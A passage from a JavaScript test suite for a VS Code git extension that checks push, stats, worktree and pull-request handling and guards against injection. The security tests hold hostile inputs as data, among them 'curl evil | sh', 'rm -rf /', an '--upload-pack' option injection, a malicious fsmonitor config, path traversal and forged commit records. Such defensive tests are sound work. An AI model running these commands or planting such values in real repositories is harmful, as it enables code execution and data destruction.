  assert.equal(r.git('log', '-1', '--format=%p').split(' ').length, 2, 'a merge commit');
  repo.dispose();
});

test('push.default=nothing refuses to guess the target', async (t) => {
  const { r, repo } = await setup(t);
  r.commit('base', { 'a.txt': '1\n' });
  withRemote(t, r);
  r.git('checkout', '-q', '-b', 'topic', '--track', 'origin/main');
  r.commit('topic', { 't.txt': 't\n' });
  r.git('config', 'push.default', 'nothing');
  await assert.rejects(repo.push(), /push\.default is "nothing"/);
  repo.dispose();
});

test('a push refused by a server hook is not reported as "behind"', async (t) => {
  const { r, repo } = await setup(t);
  r.commit('base', { 'a.txt': '1\n' });
  const { remoteDir } = withRemote(t, r);
  const hook = path.join(remoteDir, 'hooks', 'pre-receive');
  fs.writeFileSync(hook, '#!/bin/sh\necho "GH006: Protected branch update failed" >&2\nexit 1\n');
  fs.chmodSync(hook, 0o755);
  r.commit('more', { 'b.txt': 'b\n' });
  await assert.rejects(repo.push(), (e) => e.code === 'RemoteRejected');
  repo.dispose();
});

test('an inherited GIT_EDITOR never reaches git', async (t) => {
  const { repo } = await setup(t);
  const saved = process.env.GIT_EDITOR;
  process.env.GIT_EDITOR = 'vim';
  t.after(() => {
    if (saved === undefined) delete process.env.GIT_EDITOR;
    else process.env.GIT_EDITOR = saved;
  });
  const { stdout } = await repo.exec(['var', 'GIT_EDITOR']);
  assert.equal(stdout.trim(), 'true');
  repo.dispose();
});

test('temporary index files get unique names', async (t) => {
  const { repo } = await setup(t);
  const names = new Set(Array.from({ length: 50 }, () => repo.tempIndexPath('combine')));
  assert.equal(names.size, 50);
  repo.dispose();
});

// ---------------------------------------------------------------------------
// Visual metadata: stats, worktree details

test('shortstat lines are parsed, including singular and missing parts', () => {
  const { parseShortstat } = require('../src/git/parse');
  assert.deepEqual(parseShortstat(' 11 files changed, 470 insertions(+), 39 deletions(-)'), { files: 11, added: 470, deleted: 39 });
  assert.deepEqual(parseShortstat(' 1 file changed, 1 insertion(+)'), { files: 1, added: 1, deleted: 0 });
  assert.deepEqual(parseShortstat(' 2 files changed, 3 deletions(-)'), { files: 2, added: 0, deleted: 3 });
  assert.deepEqual(parseShortstat(''), { files: 0, added: 0, deleted: 0 });
});

test('log and commitStats report lines added/deleted per commit (merges against the first parent)', async (t) => {
  const { r, repo } = await setup(t);
  r.commit('base', { 'a.txt': '1\n2\n' });
  r.git('checkout', '-q', '-b', 'side');
  r.commit('side', { 's.txt': 's\ns\ns\n' });
  r.git('checkout', '-q', 'main');
  const two = r.commit('two', { 'a.txt': '1\nTWO\n', 'b.txt': 'b\n' });
  r.git('merge', '-q', '--no-ff', '-m', 'merge side', 'side');
  const merge = r.git('rev-parse', 'HEAD');
  r.commit('empty');
  const log = await repo.log({ revs: ['HEAD'], stats: true, topo: true });
  const by = new Map(log.map((c) => [c.subject, c.stats]));
  assert.deepEqual(by.get('two'), { files: 2, added: 2, deleted: 1 });
  assert.deepEqual(by.get('merge side'), { files: 1, added: 3, deleted: 0 }, 'merge: first-parent diff');
  assert.deepEqual(by.get('empty'), { files: 0, added: 0, deleted: 0 });
  assert.equal(log.length, 5, 'stats do not change which commits are listed');
  const stats = await repo.commitStats([two, merge, 'not-a-sha']);
  assert.deepEqual(stats.get(two), { files: 2, added: 2, deleted: 1 });
  assert.deepEqual(stats.get(merge), { files: 1, added: 3, deleted: 0 });
  assert.equal(stats.size, 2);
  repo.dispose();
});

test('file history carries the lines changed in that file', async (t) => {
  const { r, repo } = await setup(t);
  r.commit('one', { 'f.txt': '1\n', 'other.txt': 'x\ny\n' });
  r.commit('two', { 'f.txt': '1\n2\n3\n', 'other.txt': 'z\n' });
  const h = await repo.fileHistory('f.txt', { stats: true });
  assert.deepEqual(h.map((c) => c.stats), [{ files: 1, added: 2, deleted: 0 }, { files: 1, added: 1, deleted: 0 }]);
  repo.dispose();
});

test('worktree details: changes, upstream and the checked-out commit of every worktree', async (t) => {
  const { r, repo } = await setup(t);
  r.commit('base', { 'a.txt': '1\n' });
  const other = `${r.dir}-wt`;
  t.after(() => fs.rmSync(other, { recursive: true, force: true }));
  r.git('worktree', 'add', '-q', '-b', 'topic', other);
  fs.writeFileSync(path.join(other, 'a.txt'), '2\n');
  fs.writeFileSync(path.join(other, 'new.txt'), 'n\n');
  execFileSync('git', ['add', 'new.txt'], { cwd: other });
  r.write('u.txt', 'u\n');
  const list = await repo.getWorktreeDetails();
  const main = list.find((w) => w.isMain);
  const topic = list.find((w) => w.branch === 'topic');
  assert.equal(main.isCurrent, true);
  assert.deepEqual(main.changes, { staged: 0, unstaged: 0, untracked: 1, conflicts: 0 });
  assert.deepEqual(topic.changes, { staged: 1, unstaged: 1, untracked: 0, conflicts: 0 });
  assert.equal(topic.isCurrent, false);
  assert.equal(topic.commit.subject, 'base');
  fs.rmSync(other, { recursive: true, force: true });
  const after = await repo.getWorktreeDetails();
  assert.equal(after.find((w) => w.branch === 'topic').changes, undefined, 'a missing folder has no details, and no error');
  repo.dispose();
});

// ---------------------------------------------------------------------------
test('color.diff=always in the user config does not leak into patches or line history', async (t) => {
  const { r, repo } = await setup(t);
  r.commit('add', { 'a.txt': '1\n2\n' });
  r.commit('edit', { 'a.txt': '1\nTWO\n' });
  for (const k of ['color.diff', 'color.ui', 'color.status', 'color.branch']) r.git('config', k, 'always');
  r.write('a.txt', 'changed\n');
  assert.doesNotMatch(await repo.diffPatch('all'), /\x1b\[/);
  const h = await repo.lineHistory('a.txt', 1, 2);
  assert.deepEqual(h.map((c) => c.change.status), ['M', 'A'], 'the adding commit is recognised');
  repo.dispose();
});

test('combined diff stays exact across a selected rename commit', async (t) => {
  const { r, repo } = await setup(t);
  const pad = (lines) => lines.join('\n1\n2\n3\n4\n') + '\n';
  r.commit('base', { 'a.txt': pad(['top', 'middle', 'bottom']) });
  const c1 = r.commit('c1', { 'a.txt': pad(['TOP', 'middle', 'bottom']) });
  r.commit('c2 (not selected)', { 'a.txt': pad(['TOP', 'MIDDLE', 'bottom']) });
  r.git('mv', 'a.txt', 'b.txt');
  const c3 = r.commit('c3 rename');
  const c4 = r.commit('c4', { 'b.txt': pad(['TOP', 'MIDDLE', 'BOTTOM']) });
  const res = await repo.getMultiCommitChanges([c1, c3, c4]);
  assert.equal(res.exact, true, `failed: ${res.failed}`);
  assert.deepEqual(res.files.map((f) => [f.status[0], f.path]), [['R', 'b.txt']]);
  assert.equal(await repo.showText(res.files[0].afterRef, 'b.txt'), pad(['TOP', 'middle', 'BOTTOM']), "c2's edit is left out");
  repo.dispose();
});

test('commit message and author search take the text literally', async (t) => {
  const { r, repo } = await setup(t);
  r.commit('fix [ui] crash', { 'a.txt': '1\n' });
  r.commit('other', { 'a.txt': '2\n' });
  const hits = await repo.log({ revs: ['HEAD'], grep: '[ui]' });
  assert.deepEqual(hits.map((c) => c.subject), ['fix [ui] crash']);
  repo.dispose();
});

test('Commit Selected runs as one queue entry: a stage queued meanwhile survives', async (t) => {
  const { r, repo } = await setup(t);
  r.commit('base', { 'a.txt': '1\n', 'b.txt': '1\n' });
  r.write('a.txt', '2\n');
  r.git('add', 'a.txt');
  r.write('b.txt', '2\n');
  const commit = repo.commitStagedPaths('only a', ['a.txt']);
  const stage = repo.stage(['b.txt']); // queued behind the whole commit, not between its steps
  await Promise.all([commit, stage]);
  assert.equal(r.git('log', '-1', '--format=%s'), 'only a');
  assert.equal(r.git('diff', '--cached', '--name-only'), 'b.txt');
  repo.dispose();
});

// ---------------------------------------------------------------------------
// Create pull request target

test('pull request target: published branch, default branch, forks via "upstream"', async (t) => {
  const { r, repo } = await setup(t);
  r.commit('base', { 'a.txt': '1\n' });
  const { remoteDir } = withRemote(t, r);
  // Fetch from the local bare repository, but let the remote look like github.com.
  r.git('remote', 'set-url', '--push', 'origin', 'https://github.com/me/repo.git');
  r.git('remote', 'set-head', 'origin', 'main');
  r.git('checkout', '-q', '-b', 'topic');
  r.commit('topic', { 't.txt': 't\n' });
  const { pullRequestTarget } = requireWithVscode('../src/vscode/commands/createPullRequest');
  assert.equal((await pullRequestTarget(repo, 'topic')).needsPublish, true);
  r.git('push', '-q', remoteDir, 'topic');
  r.git('fetch', '-q', 'origin');
  r.git('branch', '-q', '-u', 'origin/topic');
  r.commit('unpushed', { 'u.txt': 'u\n' });
  let tg = await pullRequestTarget(repo, 'topic');
  assert.deepEqual([tg.headWeb, tg.headBranch, tg.baseRemote, tg.baseWeb, tg.ahead], ['https://github.com/me/repo', 'topic', 'origin', 'https://github.com/me/repo', 1]);
  assert.equal(await repo.remoteDefaultBranch('origin'), 'main');
  r.git('remote', 'add', 'upstream', 'https://github.com/org/repo.git');
  tg = await pullRequestTarget(repo, 'topic');
  assert.deepEqual([tg.baseRemote, tg.baseWeb], ['upstream', 'https://github.com/org/repo']);
  repo.dispose();
});

// ---------------------------------------------------------------------------
test('a crafted commit cannot forge log records or todo lines (control bytes in messages)', async (t) => {
  const { r, repo } = await setup(t);
  r.commit('base', { 'a.txt': '1\n' });
  const sha = r.git('rev-parse', 'HEAD');
  // Body bytes that used to split our records: RS, then a fake record whose subject holds a newline.
  const forged = `subject\n\nbody\x1e${sha}\x1f\x1fEvil\x1fe@x\x1f1\x1fEvil\x1fe@x\x1f1\x1f\x1fsubj\nexec touch PWNED\x1f\x1e`;
  r.write('b.txt', 'b\n');
  r.git('add', 'b.txt');
  execFileSync('git', ['commit', '-q', '-F', '-'], { cwd: r.dir, input: forged });
  const commits = await repo.log({ revs: ['HEAD'], body: true });
  assert.equal(commits.length, 2, 'no extra (forged) commits');
  for (const c of commits) assert.doesNotMatch(c.subject, /[\n\r\x1e\x1f]/);
  const { serializeTodo } = require('../src/git/rebaseTodo');
  const todo = serializeTodo([{ type: 'commit', action: 'pick', sha, subject: 'x\nexec touch PWNED' }, { type: 'other', text: 'break\nexec rm -rf /' }]);
  assert.equal(todo.split('\n').filter(Boolean).length, 2, 'every entry stays on one line');
  assert.doesNotMatch(todo, /^exec/m);
  assert.throws(() => serializeTodo([{ type: 'commit', action: 'exec', sha, subject: '' }]), /Invalid/);
  assert.throws(() => serializeTodo([{ type: 'commit', action: 'pick', sha: '--root', subject: '' }]), /Invalid/);
  repo.dispose();
});

test('a rebase plan may only reorder what was offered', () => {
  const { checkPlan } = requireWithVscode('../src/vscode/webviews/rebaseEditor');
  const a = 'a'.repeat(40);
  const b = 'b'.repeat(40);
  const offered = [{ type: 'commit', sha: a }, { type: 'other', text: 'break' }, { type: 'commit', sha: b }];
  checkPlan([{ type: 'commit', sha: b }, { type: 'commit', sha: a }, { type: 'other', text: 'break' }], offered);
  assert.throws(() => checkPlan([{ type: 'commit', sha: a }, { type: 'commit', sha: b }, { type: 'other', text: 'exec curl evil | sh' }], offered), /not offered/);
  assert.throws(() => checkPlan([{ type: 'commit', sha: a }, { type: 'commit', sha: 'c'.repeat(40) }, { type: 'other', text: 'break' }], offered), /not offered/);
  assert.throws(() => checkPlan([{ type: 'commit', sha: a }, { type: 'other', text: 'break' }], offered), /missing/);
  assert.throws(() => checkPlan([{ type: 'commit', sha: a }, { type: 'commit', sha: a }, { type: 'other', text: 'break' }], offered), /not offered/);
});

test('activity: commits, people, files, merged pull requests, branches and tags in the period', async (t) => {
  const { r, repo } = await setup(t);
  r.commit('old', { 'a.txt': '1\n' });
  r.git('checkout', '-q', '-b', 'feature');
  r.commit('feature work', { 'f.txt': 'f\nf\n' });
  r.git('checkout', '-q', 'main');
  r.commit('main work (#12)', { 'a.txt': '1\n2\n' });
  r.git('merge', '-q', '--no-ff', '-m', 'Merge pull request #7 from octo/feature', 'feature');
  r.git('tag', 'v1');
  const a = await repo.activity({ days: 3650 });
  assert.deepEqual(a.commits.map((c) => c.subject).sort(), ['feature work', 'main work (#12)', 'old'], 'merges are left out');
  assert.equal(a.people.length, 1);
  assert.equal(a.people[0].commits, 3);
  assert.deepEqual(a.pulls.map((p) => p.number).sort(), [12, 7]);
  assert.ok(a.files.some((f) => f.path === 'a.txt' && f.commits === 2));
  assert.ok(a.branches.some((b) => b.name === 'feature'));
  assert.ok(a.tags.some((x) => x.name === 'v1'));
  const current = await repo.activity({ days: 3650, revs: ['HEAD~1'] });
  assert.ok(!current.commits.some((c) => c.subject === 'feature work'), 'scope: the current branch only');
  const s = await repo.activitySummary(3650);
  assert.deepEqual([s.commits, s.authors, s.added], [3, 1, 4]);
  assert.strictEqual(await repo.activitySummary(3650), s, 'cached until a ref moves');
  repo.dispose();
});

// ---------------------------------------------------------------------------
test('a pull request is diffed against its fresh base, not a stale local copy (no test merge)', async (t) => {
  const { r, repo } = await setup(t);
  r.commit('base', { 'a.txt': '1\n' });
  const { other } = withRemote(t, r);
  // Upstream main moves on; our origin/main does not know.
  const otherDir = other('rev-parse', '--show-toplevel');
  fs.writeFileSync(path.join(otherDir, 'other.txt'), 'o\n');
  other('add', 'other.txt');
  other('commit', '-q', '-m', 'other.txt on main');
  other('push', '-q', 'origin', 'main');
  // A pull request branching from the new main.
  other('checkout', '-q', '-b', 'feature');
  fs.writeFileSync(path.join(otherDir, 'feat.txt'), 'f\n');
  other('add', 'feat.txt');
  other('commit', '-q', '-m', 'feature');
  const headSha = other('rev-parse', 'HEAD');
  other('push', '-q', 'origin', `HEAD:refs/pull/9/head`);
  const sha = await repo.fetchPullRequest('origin', 9, { withMerge: false });
  assert.equal(sha, headSha);
  const res = await repo.resolvePullRequestBase('origin', 9, sha, undefined, { baseBranch: 'main' });
  assert.deepEqual((await repo.diffFiles(res.mergeBase, sha)).map((f) => f.path), ['feat.txt'], 'only the pull request\'s own change');
  repo.dispose();
});

test('"Add to .gitignore" never writes through a symlinked .gitignore, nor multi-line patterns', { skip: process.platform === 'win32' }, async (t) => {
  const { r, repo } = await setup(t);
  r.commit('base', { 'a.txt': '1\n' });
  const outside = path.join(path.dirname(r.dir), `outside-${path.basename(r.dir)}`);
  fs.writeFileSync(outside, 'echo original\n');
  t.after(() => fs.rmSync(outside, { force: true }));
  fs.symlinkSync(outside, path.join(r.dir, '.gitignore'));
  await assert.rejects(repo.ignore('/build.log'), /symbolic link/);
  assert.equal(fs.readFileSync(outside, 'utf8'), 'echo original\n');
  fs.unlinkSync(path.join(r.dir, '.gitignore'));
  await assert.rejects(repo.ignore('/a\necho PWNED'), /single line/);
  await repo.ignore('/build.log');
  assert.equal(r.read('.gitignore'), '/build.log\n');
  repo.dispose();
});

test('hooks of local commands do not get the credential helper', { skip: process.platform === 'win32' }, async (t) => {
  const { r, repo } = await setup(t);
  r.commit('base', { 'a.txt': '1\n' });
  const exec = require('../src/git/exec');
  exec.configure({ env: { GIT_ASKPASS: '/fake/askpass', COMMIT_CORNER_ASKPASS_TOKEN: 'secret' } });
  t.after(() => exec.configure({ env: {} }));
  const seen = path.join(r.dir, '.git', 'seen-env');
  const hook = path.join(r.dir, '.git', 'hooks', 'pre-commit');
  fs.writeFileSync(hook, `#!/bin/sh\necho "[$GIT_ASKPASS][$COMMIT_CORNER_ASKPASS_TOKEN]" > "${seen}"\n`);
  fs.chmodSync(hook, 0o755);
  r.write('a.txt', '2\n');
  await repo.stage(['a.txt']);
  await repo.commit('change');
  assert.equal(fs.readFileSync(seen, 'utf8').trim(), '[][]');
  repo.dispose();
});

test('a worktree branch without upstream is measured against the default branch', async (t) => {
  const { r, repo } = await setup(t);
  r.commit('base', { 'a.txt': '1\n' });
  const other = `${r.dir}-agent`;
  t.after(() => fs.rmSync(other, { recursive: true, force: true }));
  r.git('worktree', 'add', '-q', '-b', 'agent', other);
  for (const n of [1, 2]) {
    fs.writeFileSync(path.join(other, `f${n}.txt`), `${n}\n`);
    execFileSync('git', ['add', '-A'], { cwd: other });
    execFileSync('git', ['-c', 'user.name=A', '-c', 'user.email=a@x', 'commit', '-q', '-m', `agent ${n}`], { cwd: other });
  }
  const agent = (await repo.getWorktreeDetails()).find((w) => w.branch === 'agent');
  assert.deepEqual([agent.base, agent.baseAhead, agent.baseBehind], ['main', 2, 0]);
  repo.dispose();
});

test('a repository committed inside a clone is not opened (its config could run programs)', { skip: process.platform === 'win32' }, async (t) => {
  const { r } = await setup(t);
  // A bare repository as ordinary files, whose config makes the folder its own working tree.
  const evil = path.join(r.dir, 'evil');
  fs.mkdirSync(path.join(evil, 'objects'), { recursive: true });
  fs.mkdirSync(path.join(evil, 'refs'), { recursive: true });
  fs.writeFileSync(path.join(evil, 'HEAD'), 'ref: refs/heads/main\n');
  const marker = path.join(r.dir, 'ran');
  fs.writeFileSync(path.join(evil, 'config'), `[core]\n\trepositoryformatversion = 0\n\tbare = false\n\tworktree = .\n\tfsmonitor = "touch '${marker}'; false"\n`);
  fs.writeFileSync(path.join(evil, 'readme.txt'), 'hi\n');
  await assert.rejects(Repository.open(evil), (e) => e.code === 'ForeignGitDir');
  assert.equal(fs.existsSync(marker), false);
  // The enclosing repository itself (and its subfolders) still opens.
  assert.equal((await Repository.open(path.join(r.dir))).root, fs.realpathSync(r.dir));
});

test('revisions that are not strings never reach git (an array would be stringified)', async (t) => {
  const { r, repo } = await setup(t);
  r.commit('base', { 'a.txt': '1\n' });
  const out = path.join(r.dir, 'written');
  await assert.rejects(repo.getCommit([`--output=${out}`]), /Refusing/);
  assert.equal(fs.existsSync(out), false);
  repo.dispose();
});

test('working-tree reads stay inside the repository', async (t) => {
  const { r, repo } = await setup(t);
  r.commit('base', { 'a.txt': '1\n' });
  const { WORKTREE } = require('../src/git/repository');
  fs.writeFileSync(`${r.dir}-secret`, 'secret\n');
  t.after(() => fs.rmSync(`${r.dir}-secret`, { force: true }));
  assert.equal(await repo.show(WORKTREE, `../${path.basename(r.dir)}-secret`), null);
  assert.equal(await repo.show(WORKTREE, '/etc/hostname'.replace(/^\//, '../../../../../../../../etc/')), null);
  assert.equal(String(await repo.show(WORKTREE, 'a.txt')), '1\n');
  repo.dispose();
});

test('a network command gets its own credential-helper lease, revoked when it exits', async (t) => {
  const { r, repo } = await setup(t);
  r.commit('base', { 'a.txt': '1\n' });
  const { remoteDir } = withRemote(t, r);
  const exec = require('../src/git/exec');
  const leases = [];
  exec.configure({
    env: () => {
      const l = { env: { COMMIT_CORNER_ASKPASS_TOKEN: `t${leases.length}` }, released: false };
      l.release = () => (l.released = true);
      leases.push(l);
      return l;
    },
  });
  t.after(() => exec.configure({ env: {} }));
  assert.ok(remoteDir);
  await repo.fetch();
  assert.ok(leases.length >= 1, 'fetch asked for a lease');
  assert.ok(leases.every((l) => l.released), 'every lease is released once git exits');
  const before = leases.length;
  r.write('a.txt', '2\n');
  await repo.stage(['a.txt']);
  await repo.commit('local');
  assert.equal(leases.length, before, 'local commands get no lease');
  repo.dispose();
});

test('notification text cannot carry command links', () => {
  const { noLinks } = requireWithVscode('../src/vscode/notify');
  const name = '[Fix line endings](command:workbench.action.terminal.sendSequence?%7B%22text%22%3A%22echo%20pwned%5Cn%22%7D)';
  const shown = noLinks(`Discard changes in "${name}"?`);
  assert.doesNotMatch(shown, /\]\(/);
  assert.equal(shown.replace(/​/g, ''), `Discard changes in "${name}"?`);
  // "[a] (url)" is not a link either way; it stays readable.
  assert.equal(noLinks('[a] (https://x)').replace(/\u200b/g, ''), '[a] (https://x)');
});

test('webview messages with anything but SHAs in sha/shas are dropped', () => {
  const { validMessageShas, selectedShas } = requireWithVscode('../src/vscode/util');
  const sha = 'a'.repeat(40);
  assert.equal(validMessageShas({ type: 'openCommit', sha }), true);
  assert.equal(validMessageShas({ type: 'ready' }), true);
  assert.equal(validMessageShas({ type: 'openCommit', sha: ['--output=/tmp/x'] }), false);
  assert.equal(validMessageShas({ type: 'openCommit', sha: '--output=/tmp/x' }), false);
  assert.equal(validMessageShas({ type: 'openCommits', shas: [sha, { toString: () => '-x' }] }), false);
  assert.equal(validMessageShas({ type: 'actions', sha: '*', shas: ['*'] }, ['*']), true);
  assert.equal(validMessageShas(null), false);
  assert.deepEqual(selectedShas({ shas: [sha, '--all'] }), [sha]);
});

test('the rebase-todo editor never opens a repository by itself', async () => {
  const vscode = requireWithVscode('vscode');
  const { RebaseTodoEditorProvider } = requireWithVscode('../src/vscode/webviews/rebaseEditor');
  let opened = 0;
  const ctx = {
    extensionUri: vscode.Uri.file(path.join(__dirname, '..')),
    manager: { getRepositoryForGitPath: () => undefined, openRepository: async () => { opened++; } },
  };
  const posted = [];
  const disposable = { dispose() {} };
  const webview = {
    cspSource: 'vscode-resource:', asWebviewUri: (u) => u, postMessage: (m) => posted.push(m), options: {}, html: '',
    onDidReceiveMessage: (fn) => ((webview.handler = fn), disposable),
  };
  const panel = { webview, onDidDispose: () => disposable, dispose() {} };
  const document = { uri: vscode.Uri.file('/tmp/outside/.git/rebase-merge/git-rebase-todo'), getText: () => `pick ${'a'.repeat(40)} x\n` };
  await new RebaseTodoEditorProvider(ctx).resolveCustomTextEditor(document, panel);
  await webview.handler({ type: 'ready' });
  assert.equal(opened, 0);
  assert.equal(posted[0].type, 'init');
});

test("a worktree's changes since it left the base: commits, uncommitted and untracked work", async (t) => {
  const { r, repo } = await setup(t);
  r.commit('base', { 'a.txt': '1\n', 'gone.txt': 'x\n' });
  const other = `${r.dir}-agent`;
  t.after(() => fs.rmSync(other, { recursive: true, force: true }));
  r.git('worktree', 'add', '-q', '-b', 'agent', other);
  fs.writeFileSync(path.join(other, 'a.txt'), '2\n');
  execFileSync('git', ['-c', 'user.name=A', '-c', 'user.email=a@x', 'commit', '-qam', 'agent work'], { cwd: other });
  r.commit('main moves on', { 'main.txt': 'm\n' });
  fs.rmSync(path.join(other, 'gone.txt'));
  fs.writeFileSync(path.join(other, 'new.txt'), 'n\n');
  assert.equal(await repo.defaultBaseRef(), 'main');
  const { mergeBase, changes } = await repo.worktreeChangesSince(other, 'main');
  assert.equal(mergeBase, r.git('rev-parse', 'main~1'));
  assert.deepEqual(changes.map((c) => `${c.status} ${c.path}`).sort(), ['A new.txt', 'D gone.txt', 'M a.txt']);
  await assert.rejects(repo.worktreeChangesSince(other, '--output=x'), /Refusing/);
  repo.dispose();
});

test('linked worktrees and submodules still open (their .git is a file pointing to the git directory)', async (t) => {
  const { r } = await setup(t);
  r.commit('base', { 'a.txt': '1\n' });
  const other = `${r.dir}-wt`;
  t.after(() => fs.rmSync(other, { recursive: true, force: true }));
  r.git('worktree', 'add', '-q', '-b', 'wt', other);
  const linked = await Repository.open(other);
  assert.equal(linked.root, fs.realpathSync(other));
  // A submodule: its .git file points into the superproject's .git/modules.
  const lib = createRepo();
  t.after(() => lib.cleanup());
  lib.commit('lib', { 'lib.txt': 'l\n' });
  r.git('-c', 'protocol.file.allow=always', 'submodule', 'add', '-q', lib.dir, 'lib');
  const sub = await Repository.open(path.join(r.dir, 'lib'));
  assert.equal(sub.root, fs.realpathSync(path.join(r.dir, 'lib')));
});

test('tab labels of revisions: short SHAs and names, never a "/" that would cut the label', () => {
  const { revLabel } = requireWithVscode('../src/vscode/uri');
  assert.equal(revLabel('a'.repeat(40)), 'aaaaaaa');
  assert.equal(revLabel(`${'b'.repeat(40)}^`), 'bbbbbbb^');
  assert.equal(revLabel(':'), 'index');
  assert.equal(revLabel(':3'), 'theirs');
  assert.equal(revLabel('~worktree~'), 'working tree');
  assert.equal(revLabel(null), 'none');
  assert.equal(revLabel('origin/main'), 'origin∕main');
});

test('right after a history rewrite, "undo" means the rewrite while HEAD is still where it left it', () => {
  const { lastRewrite, pendingRewrite } = requireWithVscode('../src/vscode/rewrites');
  const repo = { root: '/r', state: { head: { sha: 'b'.repeat(40), branch: 'main' } } };
  assert.equal(pendingRewrite(repo), undefined);
  lastRewrite.set('/r', { branch: 'main', before: 'a'.repeat(40), after: 'b'.repeat(40), label: 'Interactive rebase', at: Date.now() });
  assert.equal(pendingRewrite(repo).label, 'Interactive rebase');
  repo.state.head.sha = 'c'.repeat(40); // a commit on top
  assert.equal(pendingRewrite(repo), undefined);
  lastRewrite.delete('/r');
});

test('icon syntax in repository text is shown literally where VS Code renders $(icons)', () => {
  const { escapeIcons } = requireWithVscode('../src/vscode/util');
  assert.equal(escapeIcons('Alice $(check) Admin'), 'Alice \\$(check) Admin');
  assert.equal(escapeIcons('plain'), 'plain');
});

test('a crafted subject cannot forge or hide commits in file history, line history or stats', async (t) => {
  const { r, repo } = await setup(t);
  r.commit('base', { 'a.txt': '1\n2\n3\n' });
  // Every separator byte we ever used, a fake record with another SHA, and our own field order.
  const fake = 'd'.repeat(40);
  const subject = `evil\x1e${fake}\x1f\x1f1\x1f1\x1f\x1fMallory\x1fm@x\x1fMallory\x1fm@x\x1fForged commit\x1d`;
  r.write('a.txt', '1\n2\nthree\n');
  r.git('add', 'a.txt');
  execFileSync('git', ['commit', '-q', '-F', '-'], { cwd: r.dir, input: subject });
  const real = r.git('rev-parse', 'HEAD');
  const check = (commits, what) => {
    assert.ok(commits.some((c) => c.sha === real), `${what}: the real commit is listed`);
    assert.ok(!commits.some((c) => c.sha === fake || /Mallory|Forged/.test(c.authorName)), `${what}: no forged commit`);
  };
  check(await repo.fileHistory('a.txt', { stats: true }), 'fileHistory');
  check(await repo.lineHistory('a.txt', 3, 3), 'lineHistory');
  check(await repo.log({ revs: ['HEAD'], stats: true }), 'log({stats})');
  const stats = await repo.commitStats([real]);
  assert.deepEqual([...stats.keys()], [real]);
  assert.deepEqual(stats.get(real), { files: 1, added: 1, deleted: 1 });
  const combined = await repo.getMultiCommitChanges([real]);
  assert.deepEqual(combined.commits.map((c) => c.sha), [real]);
  repo.dispose();
});

test('remote names that look like options never reach git (fetch, ls-remote, push, PR refs)', async (t) => {
  const { r, repo } = await setup(t);
  r.commit('base', { 'a.txt': '1\n' });
  const marker = path.join(r.dir, 'PWNED');
  const evil = `--upload-pack=touch ${marker}; git-upload-pack`;
  await assert.rejects(repo.fetch({ remote: evil }), /remote name/);
  await assert.rejects(repo.listPullRequests(evil), /remote name/);
  await assert.rejects(repo.push({ remote: evil }), /remote name/);
  assert.throws(() => repo.prRef(evil, 1), /remote name/);
  assert.throws(() => repo.pushTag(['--x'], 'v1'), /remote name/);
  assert.throws(() => repo.addRemote('-x', 'u'), /remote name/);
  assert.equal(fs.existsSync(marker), false);
  // The graph page may name a commit or a PR number, never a remote or a repository.
  const { pageArgs } = requireWithVscode('../src/vscode/webviews/graphPanel');
  assert.deepEqual(pageArgs({ remote: evil, repoRoot: '/etc', sha: 'a'.repeat(40), number: 3, x: 1 }, '/repo'), { repoRoot: '/repo', sha: 'a'.repeat(40), number: 3 });
  assert.deepEqual(pageArgs({ sha: '--all', number: '3' }, '/repo'), { repoRoot: '/repo' });
  repo.dispose();
});

test('remotes whose URL has a space are listed; quoted paths are unquoted', async (t) => {
  const { r, repo } = await setup(t);
  r.commit('base', { 'a.txt': '1\n' });
  r.git('remote', 'add', 'sp', '/tmp/some dir/repo.git');
  assert.deepEqual((await repo.getRemotes()).map((x) => [x.name, x.fetchUrl]), [['sp', '/tmp/some dir/repo.git']]);
  const P = require('../src/git/parse');
  assert.equal(P.unquoteC('"tab\\there.txt"'), 'tab\there.txt');
  assert.equal(P.unquoteC('"\\303\\244.txt"'), 'ä.txt');
  assert.equal(P.unquoteC('plain "name".txt'), 'plain "name".txt');
  repo.dispose();
});

test('stash pop with an untracked file in the way explains instead of retrying', async (t) => {
  const { r, repo } = await setup(t);
  r.commit('base', { 'a.txt': '1\n' });
  r.write('a.txt', '2\n');
  r.write('new.txt', 'stashed\n');
  r.git('stash', 'push', '-u', '-q');
  r.write('new.txt', 'in the way\n');
  await assert.rejects(repo.stashApply('stash@{0}', true), /untracked file "new.txt" could not be restored/);
  assert.equal(r.git('stash', 'list').split('\n').filter(Boolean).length, 1, 'the stash is kept');
  repo.dispose();
});

test('git runs only in submodule folders that belong to this repository', async (t) => {
  const { r, repo } = await setup(t);
  r.commit('base', { 'a.txt': '1\n' });
  const fake = path.join(r.dir, 'vendor');
  const elsewhere = makeTempDir('cc-embedded-');
  t.after(() => fs.rmSync(elsewhere, { recursive: true, force: true }));
  fs.mkdirSync(fake);
  fs.writeFileSync(path.join(fake, '.git'), `gitdir: ${elsewhere}\n`);
  assert.equal(await repo.isOwnSubmodule(fake), false);
  assert.equal(await repo.isOwnSubmodule(path.join(r.dir, 'missing')), false);
  repo.dispose();
});

test('discarding an intent-to-add file never empties it (git add -N)', async (t) => {
  const { r, repo } = await setup(t);
  r.commit('base', { 'a.txt': '1\n' });
  r.write('new.txt', 'precious work\n');
  r.git('add', '-N', 'new.txt');
  r.write('a.txt', '2\n');
  await repo.refreshState();
  const skipped = await repo.discard(['new.txt', 'a.txt']);
  assert.deepEqual(skipped, ['new.txt']);
  assert.equal(r.read('new.txt'), 'precious work\n', 'left alone for the caller to trash');
  assert.equal(r.read('a.txt'), '1\n');
  await repo.forgetIntentToAdd(skipped);
  assert.match(r.git('status', '--porcelain'), /^\?\? new\.txt$/m, 'now an untracked file');
  repo.dispose();
});

test('a folder that no longer exists is not "git not found"', async () => {
  const { git: run } = require('../src/git/exec');
  await assert.rejects(run(['status'], { cwd: path.join(makeTempDir('cc-gone-'), 'removed') }), (e) => e.code === 'NoSuchFolder');
});

test('a remote name with "/" still gets its tracking branch', async (t) => {
  const { r, repo } = await setup(t);
  r.commit('base', { 'a.txt': '1\n' });
  const remoteDir = makeTempDir('cc-up-');
  t.after(() => fs.rmSync(remoteDir, { recursive: true, force: true }));
  execFileSync('git', ['init', '-q', '--bare', remoteDir]);
  r.git('remote', 'add', 'up/stream', remoteDir);
  r.git('push', '-q', 'up/stream', 'HEAD:refs/heads/dev');
  r.git('fetch', '-q', 'up/stream');
  assert.deepEqual(await repo.trackFlag('dev', 'up/stream/dev'), ['--track']);
  repo.dispose();
});

test('worktree paths with newlines survive NUL-separated parsing', () => {
  const P = require('../src/git/parse');
